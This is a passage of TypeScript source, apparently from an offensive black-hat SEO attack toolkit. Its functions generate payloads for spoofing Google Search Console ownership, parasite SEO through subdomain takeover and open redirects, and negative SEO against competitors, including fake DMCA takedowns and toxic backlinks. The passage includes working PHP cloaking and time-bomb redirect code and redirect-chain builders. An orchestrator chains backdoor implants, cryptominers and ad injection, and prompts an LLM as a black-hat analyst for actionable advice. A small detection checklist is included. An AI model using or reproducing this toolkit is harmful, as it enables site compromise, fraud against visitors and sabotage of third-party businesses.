// ═══════════════════════════════════════════════════════

export function gscExploit(targetUrl: string): Payload[] {
  const payloads: Payload[] = [];
  const domain = getDomain(targetUrl);

  // Meta tag verification spoof
  const metaTag = `<meta name="google-site-verification" content="${md5(domain)}" />`;
  payloads.push({
    type: "gsc_meta_verify",
    code: `<?php
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if (preg_match('/googlebot|google-site-verification/i', $ua)) {
    echo '${metaTag}';
}
?>`,
    technique: "GSC meta tag inject: bot-only verification tag for ownership claim",
    nextStep: "Claim ownership in Google Search Console with meta tag method",
  });

  // HTML file verification
  const verifyFilename = `google${md5(domain).substring(0, 16)}.html`;
  payloads.push({
    type: "gsc_file_verify",
    filename: verifyFilename,
    content: `google-site-verification: ${verifyFilename}`,
    technique: "Upload verification HTML file to webroot for GSC ownership",
  });

  // Post-verification abuse
  payloads.push({
    type: "gsc_api_abuse",
    technique: "GSC API abuse: submit spam sitemaps + force index + remove legitimate pages",
    code: `# After claiming GSC ownership:
# 1. Submit spam sitemaps (sitemap-casino.xml, sitemap-pharma.xml, etc.)
# 2. Request indexing of spam pages via Indexing API
# 3. Remove original sitemap to replace with spam content
# 4. Use URL Inspection to force crawl of specific spam URLs`,
    features: ["sitemap_submit", "force_index", "remove_legit_pages"],
  });

  return payloads;
}

export function parasiteSeo(targetUrl: string, count: number = 10): Payload[] {
  const payloads: Payload[] = [];
  const redirectUrl = "https://spam-destination.example.com";

  // Subdomain takeover parasites
  for (let i = 0; i < Math.min(count, 4); i++) {
    const platform = randomChoice(PARASITE_PLATFORMS.subdomain_takeover);
    const niche = randomChoice(SPAM_NICHES);
    payloads.push({
      type: "subdomain_parasite",
      platform,
      niche,
      technique: `Subdomain takeover on ${platform}: create spam page on DA90+ domain`,
      effect: "Spam content inherits high domain authority, ranks fast",
    });
  }

  // UGC platform abuse
  for (let i = 0; i < Math.min(count, 4); i++) {
    const platform = randomChoice(PARASITE_PLATFORMS.ugc_abuse);
    const niche = randomChoice(SPAM_NICHES);
    payloads.push({
      type: "ugc_parasite",
      platform,
      niche,
      technique: `UGC abuse on ${platform}: publish spam content as user-generated content`,
      effect: "Leverages platform's authority for fast ranking",
    });
  }

  // Open redirect abuse
  for (const redirect of PARASITE_PLATFORMS.open_redirect) {
    payloads.push({
      type: "open_redirect_abuse",
      platform: redirect.split("/")[0],
      url: `https://${redirect}${encodeURIComponent(redirectUrl)}`,
      technique: `Open redirect via ${redirect.split("/")[0]}: trusted domain redirects to spam`,
      effect: "Link appears to be from trusted domain (Google, Facebook, etc.)",
    });
  }

  return payloads;
}

export function negativeSeo(competitor: string, intensity: number = 50): Payload[] {
  const payloads: Payload[] = [];
  const compDomain = getDomain(competitor);

  // Toxic backlink blast
  const toxicLinks = [];
  for (let i = 0; i < intensity; i++) {
    const source = randomChoice(TOXIC_LINK_SOURCES).replace("{n}", String(randomInt(1, 500)));
    toxicLinks.push({ source, target: competitor, anchor: randomChoice(SPAM_NICHES).replace(/-/g, " ") });
  }
  payloads.push({
    type: "toxic_backlink_blast",
    count: toxicLinks.length,
    sampleLinks: toxicLinks.slice(0, 5),
    technique: `Mass toxic backlinks: ${intensity} links from spam/porn/casino domains → trigger Google penalty`,
    effect: "Unnatural link profile → algorithmic penalty",
  });

  // Duplicate content attack
  payloads.push({
    type: "duplicate_content_attack",
    technique: "Scrape competitor content → republish on 100+ domains → dilute originality signal",
    effect: "Google can't determine original source → rankings drop for competitor",
    domains: Array.from({ length: 10 }, () => `${randomString(8)}${randomChoice(SPAM_TLDS)}`),
  });

  // Fake DMCA takedowns
  payloads.push({
    type: "fake_dmca_takedown",
    technique: "File fake DMCA complaints against competitor's top-ranking pages",
    effect: "Pages temporarily removed from Google index (even if reinstated later, rankings drop)",
  });

  // Anchor text over-optimization
  const moneyKeywords = [
    `best ${compDomain}`, `buy from ${compDomain}`, `${compDomain} deals`,
    `cheap ${compDomain}`, `${compDomain} discount`, `${compDomain} coupon`,
  ];
  payloads.push({
    type: "anchor_over_optimization",
    count: intensity,
    anchors: moneyKeywords,
    technique: "Mass exact-match anchor links → trigger over-optimization penalty",
    effect: "Google algorithmic penalty for unnatural link profile",
  });

  // Crawl budget waste
  payloads.push({
    type: "crawl_budget_waste",
    technique: "Inject infinite URL generator → waste competitor's Google crawl budget",
    effect: "Google can't crawl important pages → rankings drop",
    code: `<?php
// Infinite URL generator — wastes Google's crawl budget
$path = $_SERVER['REQUEST_URI'];
echo '<a href="' . $path . '/sub-' . mt_rand(1,99999) . '">More</a>';
echo '<a href="' . $path . '/page-' . mt_rand(1,99999) . '">Related</a>';
?>`,
  });

  // Hotlink bandwidth drain
  payloads.push({
    type: "hotlink_bandwidth_drain",
    technique: "Hidden image embeds from competitor → drain bandwidth + increase hosting costs",
    effect: "Increased hosting costs, possible downtime",
  });

  return payloads;
}

export function cachePoison(targetUrl: string, redirectUrl: string): Payload[] {
  const payloads: Payload[] = [];

  // Time-bomb content
  payloads.push({
    type: "time_bomb_content",
    technique: "Clean first 48h (gets cached by Google) → spam after (cache shows clean, live page redirects)",
    effect: "Google cache shows legitimate content while real page redirects to spam",
    code: `<?php
$deploy_time = ${Math.floor(Date.now() / 1000)};
$hours_elapsed = (time() - $deploy_time) / 3600;
if ($hours_elapsed < 48) {
    include('original_page.php'); // Clean phase
} else {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    if (preg_match('/googlebot/i', $ua)) {
        include('original_page.php'); // Keep cache clean
    } else {
        header("Location: ${redirectUrl}", true, 302); // Human → spam
        exit;
    }
}
?>`,
  });

  // Cache-Control manipulation
  payloads.push({
    type: "cache_control_manipulation",
    technique: "Max-age=30d for bots (cache clean version), no-cache for humans (always redirect)",
    code: `<?php
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if (preg_match('/googlebot|bingbot/i', $ua)) {
    header('Cache-Control: public, max-age=2592000');
    echo '<html><body><h1>Legitimate Business</h1></body></html>';
} else {
    header('Cache-Control: no-cache, no-store');
    header("Location: ${redirectUrl}", true, 302);
    exit;
}
?>`,
  });

  // 304 Not Modified abuse
  payloads.push({
    type: "304_not_modified_abuse",
    technique: "Always return 304 to bot → cache never updates even if page changes to spam",
    effect: "Lock Google's cached version permanently to clean content",
  });

  // AMP cache abuse
  payloads.push({
    type: "amp_cache_abuse",
    technique: "Create AMP page → gets served from Google's AMP cache CDN (google.com/amp/)",
    effect: "Spam content served from google.com domain — extreme trust signal",
  });

  return payloads;
}

export function redirectNetwork(targetUrl: string, hops: number = 5): Payload[] {
  const payloads: Payload[] = [];
  const redirectUrl = "https://spam-destination.example.com";

  // Generate hop domains
  const hopDomains = Array.from({ length: hops }, () => `${randomString(randomInt(5, 10))}${randomChoice(EXPIRED_TLDS)}`);

  // Multi-hop chain
  const chain = hopDomains.map((domain, i) => ({
    hopNumber: i + 1,
    domain,
    redirectTo: i < hopDomains.length - 1 ? `https://${hopDomains[i + 1]}/gate` : redirectUrl,
    method: randomChoice(["301", "302", "meta_refresh", "js_redirect"]),
    trackingParam: `h=${i + 1}&s=${md5(domain).substring(0, 6)}`,
  }));

  payloads.push({
    type: "multi_hop_chain",
    hops: chain,
    totalHops: hops,
    finalDestination: redirectUrl,
    technique: `${hops}-hop redirect chain through expired domains → untraceable to final destination`,
  });

  // Rotation network
  const rotationChains = [];
  for (let c = 0; c < 3; c++) {
    const rotHops = Array.from({ length: randomInt(2, 4) }, () => `${randomString(7)}${randomChoice(EXPIRED_TLDS)}`);
    const niche = randomChoice(Object.keys(TDS_DESTINATIONS));
    rotationChains.push({
      chainId: c + 1,
      hops: rotHops,
      destination: TDS_DESTINATIONS[niche].url,
      niche,
      weight: TDS_DESTINATIONS[niche].weight,
    });
  }
  payloads.push({
    type: "rotation_network",
    chains: rotationChains,
    technique: "3 parallel redirect chains with weighted random selection",
    features: ["weighted_random", "multi_chain", "niche_targeting"],
  });

  // Dead switch failover
  payloads.push({
    type: "dead_switch_failover",
    technique: "Auto-failover: if primary chain is taken down → switch to backup chain automatically",
    features: ["auto_failover", "health_check", "backup_chains"],
  });

  // Domain fronting
  payloads.push({
    type: "domain_fronting",
    technique: "CDN domain fronting: traffic appears to go to legitimate CDN, actually routes to spam backend",
    effect: "Impossible to block without blocking entire CDN",
  });

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  DEFENSE: DETECTION SCANNER
// ═══════════════════════════════════════════════════════

export function detectSeoSpam(targetUrl: string): DetectionResult[] {
  const detections: DetectionResult[] = [];
  const domain = getDomain(targetUrl);

  // Check indicators
  detections.push({
    indicator: "Cloaked Content Detection",
    severity: "critical",
    description: "Check if different content is served to search bots vs human visitors by comparing UA-based responses",
    recommendation: "Compare page source with Googlebot UA vs Chrome UA. Use Google's 'Fetch as Google' in Search Console.",
  });

  detections.push({
    indicator: "Hidden Link/Text Detection",
    severity: "high",
    description: "Scan for CSS-hidden elements (display:none, font-size:0, position:absolute;left:-9999px) containing links",
    recommendation: "Inspect DOM for hidden elements with outbound links. Check footer/header for injected divs.",
  });

  detections.push({
    indicator: "Sitemap Integrity Check",
    severity: "high",
    description: "Verify sitemap.xml contains only legitimate URLs, no spam slugs (cheap-*, buy-*, best-*)",
    recommendation: "Download and audit sitemap.xml. Check for unexpected URL patterns or domains.",
  });

  detections.push({
    indicator: ".htaccess / Server Config Audit",
    severity: "critical",
    description: "Check for unauthorized rewrite rules, conditional redirects, and bot-specific routing",
    recommendation: "Review .htaccess, nginx.conf, web.config for RewriteRule/if blocks targeting User-Agent or Referer.",
  });

  detections.push({
    indicator: "JavaScript Redirect Detection",
    severity: "high",
    description: "Scan for JS-based redirects: window.location, meta refresh, history.pushState hijack, Service Worker",
    recommendation: "Search source for window.location, setTimeout+redirect, history.pushState, serviceWorker.register.",
  });

  detections.push({
    indicator: "Canonical/Meta Tag Hijack",
    severity: "high",
    description: "Verify canonical tags, Open Graph, and hreflang point to legitimate URLs",
    recommendation: "Check <link rel='canonical'>, og:url, and hreflang tags for unexpected domains.",
  });

  detections.push({
    indicator: "Google Search Console Ownership",
    severity: "critical",
    description: "Verify no unauthorized users have claimed ownership via meta tag, HTML file, or DNS",
    recommendation: "Check GSC Users & Permissions. Look for unknown verification files in webroot.",
  });

  detections.push({
    indicator: "Backlink Profile Toxicity",
    severity: "high",
    description: "Analyze backlink profile for sudden spikes of toxic/spam links (negative SEO indicator)",
    recommendation: "Use Ahrefs/Moz to check for toxic backlinks. Monitor for sudden link velocity changes.",
  });

  detections.push({
    indicator: "Crypto Miner Detection",
    severity: "critical",
    description: "Scan for WebAssembly miners, Service Worker miners, and external mining scripts",
    recommendation: "Check for wasm-miner, coinhive, cryptonight scripts. Monitor CPU usage spikes.",
  });

  detections.push({
    indicator: "Doorway Page Detection",
    severity: "high",
    description: "Check for mass-generated pages targeting city+niche combinations with thin content",
    recommendation: "Audit indexed pages in GSC. Look for patterns like /cheap-*-deals-* or /buy-*-online-*.",
  });

  detections.push({
    indicator: "Traffic Distribution System (TDS)",
    severity: "critical",
    description: "Detect multi-stage traffic filtering: fingerprinting, geo-checks, weighted redirect distribution",
    recommendation: "Monitor network requests for gate/TDS endpoints. Check for fingerprint collection scripts.",
  });

  detections.push({
    indicator: "Cache Poisoning Detection",
    severity: "medium",
    description: "Compare Google's cached version with live page. Check for time-bomb content swaps.",
    recommendation: "Use 'cache:domain.com' in Google. Compare with live page. Check Cache-Control headers.",
  });

  return detections;
}

// ═══════════════════════════════════════════════════════
//  FULL CHAIN ORCHESTRATOR
// ═══════════════════════════════════════════════════════

export async function runFullChain(targetDomain: string, redirectUrl?: string): Promise<FullChainReport> {
  const startTime = Date.now();
  const target = ensureUrl(targetDomain);
  const redirect = redirectUrl || "https://spam-destination.example.com";
  const domain = getDomain(target);

  // Phase 1: Web Compromise & Injection
  const phase1Payloads = [
    ...webImplant(target),
    ...configPoison(target, redirect),
    ...cloakedRedirect(target, redirect),
    ...doorwayGen(target, 10),
  ];
  const phase1: PhaseResult = {
    phase: 1,
    name: "Web Compromise & Injection",
    capabilities: ["web_implant", "config_poison", "cloaked_redirect", "doorway_gen"],
    payloads: phase1Payloads,
    summary: `${phase1Payloads.length} payloads: backdoors, config poisoning, cloaking, ${10} doorway pages`,
    riskLevel: 9,
  };

  // Phase 2: Search Engine Manipulation
  const phase2Payloads = [
    ...sitemapPoison(target, 50),
    ...indexManipulate(target, redirect),
    ...linkSpam(target, 20),
    ...metaHijack(target, redirect),
  ];
  const phase2: PhaseResult = {
    phase: 2,
    name: "Search Engine Manipulation",
    capabilities: ["sitemap_poison", "index_manipulate", "link_spam", "meta_hijack"],
    payloads: phase2Payloads,
    summary: `${phase2Payloads.length} payloads: poisoned sitemap (50 URLs), index manipulation, ${20} spam links, meta hijack`,
    riskLevel: 8,
  };

  // Phase 3: User Click → Conditional Redirect
  const phase3Payloads = [
    ...conditionalRedirect(target, redirect),
    ...jsInject(target, redirect),
    ...trafficGate(target, redirect),
  ];
  const phase3: PhaseResult = {
    phase: 3,
    name: "User Click → Conditional Redirect",
    capabilities: ["conditional_redirect", "js_inject", "traffic_gate"],
    payloads: phase3Payloads,
    summary: `${phase3Payloads.length} payloads: geo/time/device redirects, JS injection, TDS gate`,
    riskLevel: 7,
  };

  // Phase 4: Monetization
  const phase4Payloads = [
    ...adInject(target),
    ...cryptoInject(target),
  ];
  const phase4: PhaseResult = {
    phase: 4,
    name: "Monetization",
    capabilities: ["ad_inject", "crypto_inject"],
    payloads: phase4Payloads,
    summary: `${phase4Payloads.length} payloads: ad injection (popunder, overlay, native), crypto miners (WASM, SW, conditional)`,
    riskLevel: 6,
  };

  // Phase 5: Advanced SEO Attacks
  const phase5Payloads = [
    ...gscExploit(target),
    ...parasiteSeo(target, 8),
    ...negativeSeo(target, 30),
    ...cachePoison(target, redirect),
    ...redirectNetwork(target, 4),
  ];
  const phase5: PhaseResult = {
    phase: 5,
    name: "Advanced SEO Attacks",
    capabilities: ["gsc_exploit", "parasite_seo", "negative_seo", "cache_poison", "redirect_network"],
    payloads: phase5Payloads,
    summary: `${phase5Payloads.length} payloads: GSC exploit, parasite SEO, negative SEO, cache poison, redirect network`,
    riskLevel: 9,
  };

  // Detection
  const detection = detectSeoSpam(target);

  const allPayloads = [...phase1Payloads, ...phase2Payloads, ...phase3Payloads, ...phase4Payloads, ...phase5Payloads];

  // AI Analysis
  let aiAnalysis: string | undefined;
  try {
    const resp = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an elite Black Hat SEO analyst. Analyze the attack chain results for domain "${domain}" and provide:
1. Overall vulnerability assessment (1-10 scale)
2. Most critical attack vectors for this specific domain
3. Estimated time to achieve ranking manipulation
4. Recommended defense priorities
5. Advanced techniques specific to this domain's tech stack
Be technical, specific, and actionable. Use Thai language.`,
        },
        {
          role: "user",
          content: `Attack chain report for ${domain}:
- Phase 1 (Compromise): ${phase1Payloads.length} payloads
- Phase 2 (Index Manipulation): ${phase2Payloads.length} payloads
- Phase 3 (Redirect): ${phase3Payloads.length} payloads
- Phase 4 (Monetization): ${phase4Payloads.length} payloads
- Phase 5 (Advanced): ${phase5Payloads.length} payloads
- Detection indicators: ${detection.length}
Total: ${allPayloads.length} payloads generated

Key capabilities used: web_implant, config_poison, cloaked_redirect, doorway_gen, sitemap_poison, index_manipulate, link_spam, meta_hijack, conditional_redirect, js_inject, traffic_gate, ad_inject, crypto_inject, gsc_exploit, parasite_seo, negative_seo, cache_poison, redirect_network`,
        },
      ],
    });
    const content = resp.choices?.[0]?.message?.content;
    aiAnalysis = typeof content === "string" ? content : Array.isArray(content) ? content.map((c: any) => c.text || "").join("") : undefined;
  } catch {
    aiAnalysis = undefined;
  }

  const elapsed = Date.now() - startTime;

  return {
    targetDomain: domain,
    redirectUrl: redirect,
    phases: [phase1, phase2, phase3, phase4, phase5],
    detection,
    totalPayloads: allPayloads.length,
    totalPages: allPayloads.filter(p => p.type === "doorway_page").length,
    totalImplants: allPayloads.filter(p => p.type?.includes("implant") || p.type?.includes("inject")).length,
    totalGates: allPayloads.filter(p => p.type?.includes("gate") || p.type?.includes("tds")).length,
    totalParasites: allPayloads.filter(p => p.type?.includes("parasite")).length,
    totalNegativeAttacks: allPayloads.filter(p => p.type?.includes("toxic") || p.type?.includes("negative") || p.type?.includes("dmca") || p.type?.includes("anchor_over") || p.type?.includes("crawl_budget") || p.type?.includes("hotlink")).length,
    totalRedirectChains: allPayloads.filter(p => p.type?.includes("chain") || p.type?.includes("rotation") || p.type?.includes("dead_switch") || p.type?.includes("domain_fronting")).length,
    totalDetections: detection.length,
    aiAnalysis,
    elapsed,
  };
}

export async function runSinglePhase(targetDomain: string, phase: number, redirectUrl?: string): Promise<PhaseResult> {
  const target = ensureUrl(targetDomain);
  const redirect = redirectUrl || "https://spam-destination.example.com";

  switch (phase) {
    case 1: {
      const payloads = [...webImplant(target), ...configPoison(target, redirect), ...cloakedRedirect(target, redirect), ...doorwayGen(target, 10)];
      return { phase: 1, name: "Web Compromise & Injection", capabilities: ["web_implant", "config_poison", "cloaked_redirect", "doorway_gen"], payloads, summary: `${payloads.length} payloads`, riskLevel: 9 };
    }
    case 2: {
      const payloads = [...sitemapPoison(target, 50), ...indexManipulate(target, redirect), ...linkSpam(target, 20), ...metaHijack(target, redirect)];
      return { phase: 2, name: "Search Engine Manipulation", capabilities: ["sitemap_poison", "index_manipulate", "link_spam", "meta_hijack"], payloads, summary: `${payloads.length} payloads`, riskLevel: 8 };
    }
    case 3: {
      const payloads = [...conditionalRedirect(target, redirect), ...jsInject(target, redirect), ...trafficGate(target, redirect)];
      return { phase: 3, name: "User Click → Conditional Redirect", capabilities: ["conditional_redirect", "js_inject", "traffic_gate"], payloads, summary: `${payloads.length} payloads`, riskLevel: 7 };
    }
    case 4: {
      const payloads = [...adInject(target), ...cryptoInject(target)];
      return { phase: 4, name: "Monetization", capabilities: ["ad_inject", "crypto_inject"], payloads, summary: `${payloads.length} payloads`, riskLevel: 6 };
    }
    case 5: {
      const payloads = [...gscExploit(target), ...parasiteSeo(target, 8), ...negativeSeo(target, 30), ...cachePoison(target, redirect), ...redirectNetwork(target, 4)];
      return { phase: 5, name: "Advanced SEO Attacks", capabilities: ["gsc_exploit", "parasite_seo", "negative_seo", "cache_poison", "redirect_network"], payloads, summary: `${payloads.length} payloads`, riskLevel: 9 };
    }
    default:
      throw new Error(`Invalid phase: ${phase}. Must be 1-5.`);
  }
}

export function runSingleCapability(targetDomain: string, capability: string, redirectUrl?: string, options?: { count?: number; niche?: string; intensity?: number }): Payload[] | DetectionResult[] {
  const target = ensureUrl(targetDomain);
  const redirect = redirectUrl || "https://spam-destination.example.com";
  const count = options?.count || 10;
  const intensity = options?.intensity || 50;

  const capMap: Record<string, () => Payload[] | DetectionResult[]> = {
    web_implant: () => webImplant(target),
    config_poison: () => configPoison(target, redirect),
    cloaked_redirect: () => cloakedRedirect(target, redirect),
    doorway_gen: () => doorwayGen(target, count, options?.niche),
    sitemap_poison: () => sitemapPoison(target, count),
    index_manipulate: () => indexManipulate(target, redirect),
    link_spam: () => linkSpam(target, count),
    meta_hijack: () => metaHijack(target, redirect),
    conditional_redirect: () => conditionalRedirect(target, redirect),
    js_inject: () => jsInject(target, redirect),
    traffic_gate: () => trafficGate(target, redirect),
    ad_inject: () => adInject(target),
    crypto_inject: () => cryptoInject(target),
    gsc_exploit: () => gscExploit(target),
    parasite_seo: () => parasiteSeo(target, count),
    negative_seo: () => negativeSeo(target, intensity),
    cache_poison: () => cachePoison(target, redirect),
    redirect_network: () => redirectNetwork(target, count),
    seo_detect: () => detectSeoSpam(target),
  };

  const fn = capMap[capability];
  if (!fn) throw new Error(`Unknown capability: ${capability}. Available: ${Object.keys(capMap).join(", ")}`);
  return fn();
}
